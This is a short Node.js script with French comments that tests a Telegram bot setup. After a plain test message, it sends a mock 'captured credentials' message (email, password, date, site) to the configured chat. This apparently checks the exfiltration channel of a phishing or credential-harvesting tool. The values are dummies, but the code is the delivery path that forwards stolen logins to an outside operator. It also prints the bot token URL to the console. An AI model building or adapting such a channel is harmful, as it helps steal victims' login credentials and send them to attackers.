const axios = require('axios');
const config = require('./config');

// Fonction pour tester l'envoi de messages à Telegram
async function testTelegram() {
    console.log('🧪 Test de la configuration Telegram...\n');
    
    const message = `🔄 <b>Test du bot Telegram</b>\n✅ Si vous recevez ce message, votre configuration fonctionne correctement!\n⏱ <b>Date:</b> ${new Date().toLocaleString()}`;
    
    try {
        const url = `https://api.telegram.org/bot${config.TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        console.log('📤 Envoi du message de test...');
        console.log(`🔗 URL: ${url}`);
        console.log(`💬 Chat ID: ${config.TELEGRAM_CHAT_ID}`);
        console.log(`📝 Message: ${message.replace(/<[^>]*>/g, '')}\n`);
        
        const response = await axios.post(url, {
            chat_id: config.TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        
        console.log('✅ Message envoyé avec succès!');
        console.log('📊 Réponse:', JSON.stringify(response.data, null, 2));
        
        // Test de capture d'identifiants
        console.log('\n🔐 Test de capture d\'identifiants...');
        
        const captureMessage = `🔐 <b>Test de capture d'identifiants</b>\n📧 <b>Email:</b> test@example.com\n🔑 <b>Mot de passe:</b> password123\n⏱ <b>Date:</b> ${new Date().toLocaleString()}\n🌐 <b>Site:</b> test`;
        
        const captureResponse = await axios.post(url, {
            chat_id: config.TELEGRAM_CHAT_ID,
            text: captureMessage,
            parse_mode: 'HTML'
        });
        
        console.log('✅ Test de capture réussi!');
        console.log('📊 Réponse:', JSON.stringify(captureResponse.data, null, 2));
        
    } catch (error) {
        console.error('❌ Erreur lors du test:');
        console.error('📝 Message d\'erreur:', error.message);
        
        if (error.response) {
            console.error('📊 Réponse d\'erreur:', JSON.stringify(error.response.data, null, 2));
            console.error('🔢 Code de statut:', error.response.status);
        }
        
        console.log('\n🔧 Vérifications à effectuer:');
        console.log('1. Vérifiez que le token du bot est correct');
        console.log('2. Vérifiez que le Chat ID est correct');
        console.log('3. Vérifiez que le bot a été ajouté au groupe/canal');
        console.log('4. Vérifiez votre connexion internet');
    }
}

// Exécuter le test
testTelegram();
